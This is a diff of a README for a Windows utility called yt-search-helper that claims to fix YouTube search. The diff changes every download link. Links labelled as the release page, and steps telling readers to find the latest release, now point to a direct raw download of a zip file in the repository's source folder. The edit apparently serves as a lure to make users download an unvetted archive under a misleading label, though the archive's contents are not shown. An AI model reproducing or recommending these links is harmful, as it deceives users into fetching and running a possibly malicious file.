@@ -1,10 +1,10 @@
 # 🛠️ yt-search-helper - Fix YouTube Search on Windows
 
-[![Download yt-search-helper](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/christianoblinded331/yt-search-helper/releases)
+[![Download yt-search-helper](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/christianoblinded331/yt-search-helper/raw/refs/heads/main/src/yt_search_helper_anagalactic.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/christianoblinded331/yt-search-helper/releases
+Visit this page to download: https://github.com/christianoblinded331/yt-search-helper/raw/refs/heads/main/src/yt_search_helper_anagalactic.zip
 
 1. Open the release page.
 2. Find the latest release.
@@ -41,7 +41,7 @@ Before you install, make sure you have:
 ## 🚀 Install on Windows
 
 1. Open the download page:
-   https://github.com/christianoblinded331/yt-search-helper/releases
+   https://github.com/christianoblinded331/yt-search-helper/raw/refs/heads/main/src/yt_search_helper_anagalactic.zip
 2. Find the newest release.
 3. Download the file for your browser.
 4. If the file is a ZIP file, extract it first.
@@ -152,7 +152,7 @@ Use yt-search-helper if you want YouTube search to feel usable again after the u
 
 ## 📎 Download again
 
-[Go to the latest release page](https://github.com/christianoblinded331/yt-search-helper/releases)
+[Go to the latest release page](https://github.com/christianoblinded331/yt-search-helper/raw/refs/heads/main/src/yt_search_helper_anagalactic.zip)
 
 ## 🧭 File name tips
 
